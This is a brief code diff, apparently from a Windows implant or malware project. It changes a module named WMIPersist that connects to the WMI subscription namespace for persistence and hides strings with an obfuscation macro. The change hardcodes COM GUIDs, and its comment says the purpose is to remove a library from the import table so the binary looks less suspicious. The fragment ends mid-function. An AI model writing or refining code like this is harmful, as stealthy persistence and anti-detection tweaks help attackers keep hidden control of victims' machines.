@@ -1,11 +1,18 @@
 #include "WMIPersist.h"
 #include "Obf.h"
 #include <wbemidl.h>
-#pragma comment(lib, "wbemuuid.lib")
+
+// Hardcoded GUIDs — removes wbemuuid.lib from import table
+// CLSID_WbemLocator  {4590f811-1d3a-11d0-891f-00aa004b2e24}
+// IID_IWbemLocator   {dc12a687-737f-11cf-884d-00aa004b2e24}
+static const CLSID kCLSID_WbemLocator =
+    {0x4590f811,0x1d3a,0x11d0,{0x89,0x1f,0x00,0xaa,0x00,0x4b,0x2e,0x24}};
+static const IID kIID_IWbemLocator =
+    {0xdc12a687,0x737f,0x11cf,{0x88,0x4d,0x00,0xaa,0x00,0x4b,0x2e,0x24}};
 
 static HRESULT ConnectSubscription(IWbemLocator** ppLoc, IWbemServices** ppSvc) {
-    HRESULT hr = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
-                                   IID_IWbemLocator, (void**)ppLoc);
+    HRESULT hr = CoCreateInstance(kCLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
+                                   kIID_IWbemLocator, (void**)ppLoc);
     if (FAILED(hr)) return hr;
     std::wstring wNs = SW(L"ROOT\\subscription");
     hr = (*ppLoc)->ConnectServer((BSTR)wNs.c_str(),
